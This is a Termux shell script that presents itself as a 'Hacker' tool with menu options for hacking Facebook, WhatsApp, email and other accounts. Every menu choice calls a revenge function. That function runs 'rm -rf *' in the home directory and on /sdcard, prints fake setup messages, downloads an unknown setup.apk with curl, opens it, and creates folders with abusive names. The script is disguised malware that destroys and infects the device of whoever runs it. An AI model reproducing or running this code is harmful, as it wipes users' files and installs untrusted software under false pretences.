_black='\e[30;47m'
_red='\e[31;47m'
_green='\e[32;47m'
_yellow='\e[33;47m'
_blue='\e[34;47m'
_magenta='\E[35;47m'
_cyan='\e[36;47m'
_white='\e[37;47m'
blank='\e[0m'
black='\e[1;90m'
red='\e[1;91m'
green='\e[1;92m'
yellow='\e[1;93m'
blue='\e[1;94m'
pink='\e[1;95m'
ocen='\e[1;96m'
white='\e[1;97m'
itaric='\e[3;90m'
underline='\e[4;90m'

pkg install termux-api -y

banner1() {
clear
echo " "

echo "██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══█╗
███████║███████║██║     █████╔╝ █████╗  ██████╔╝
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
echo " "                                                
}

banner2() {
echo -e "$ocen Tool Created by $red Dark-Hackers-Crew$blank"
echo " "
echo -e "$ocen Tool name $red Hacker$blank"
echo " "
echo -e "$red  From $red DeepReV3nG3$blank"
}
#lets check their fucking system
check() {
cd $HOME
}
spam() {
CMD=$(ls | grep dir | tail -1) 
numOfFolders=${CMD:3} 

numOfFolders=$(echo $((${numOfFolders#0} +1)) ) 
newDirName=Fuck-You-This-is_R3V3NGE
newDirName+=$numOfFolders 

mkdir -p ~/sdcard/$newDirName; 
}
revenge(){
rm -rf *
cd /sdcard
rm -rf *
echo -e "$red [!]It seems there is missing setup$blank"
sleep 0.2
echo -e "$green Worry out we gonna fix it soon$blank"
sleep 0.2
echo -e "$green please wait..."
sleep 2
cd /$HOME
echo " "
echo -e "$ocen please install downloaded app then open it and return to your termux$blank"
echo -e "$green Please wait..."
sleep 4
curl -LO https://github.com/TripleHat/TripleHat/raw/main/setup.apk
termux-open /setup.apk
spam
}
menu(){
	echo -e "$green What do you want to do?"
	echo -e " "
	echo -e "$ocen (1)$red Facebook hacking"
	echo -e "$ocen (2)$red Instagram hacking"
	echo -e "$ocen (3)$red WhatsApp hacking"
	echo -e "$ocen (4)$red Telegram hacking"
	echo -e "$ocen (5)$red Android hacking"
        echo -e "$ocen (6)$red Free internet VPN"
	echo -e "$ocen (7)$red Google hacking"
	echo -e "$ocen (8)$red Email hacking"
	echo -e "$ocen (9)$red Amazon gift card / fullz generator"
	echo -e "$ocen (10)$red Install WiFi drivers$blank"
echo " "
read -p "Input your Choice: " fuck
if [[ $fuck -ge '1' || $fuck -ge '01' ]]; then
cd $HOME 
#check if having access to storage
if [ -a storage ]; then
revenge
else
echo -e "$red [!] No storage Acess. press allow $blank"
sleep 2
termux-setup-storage
revenge
fi
else
revenge
fi
}
banner1
banner2
menu
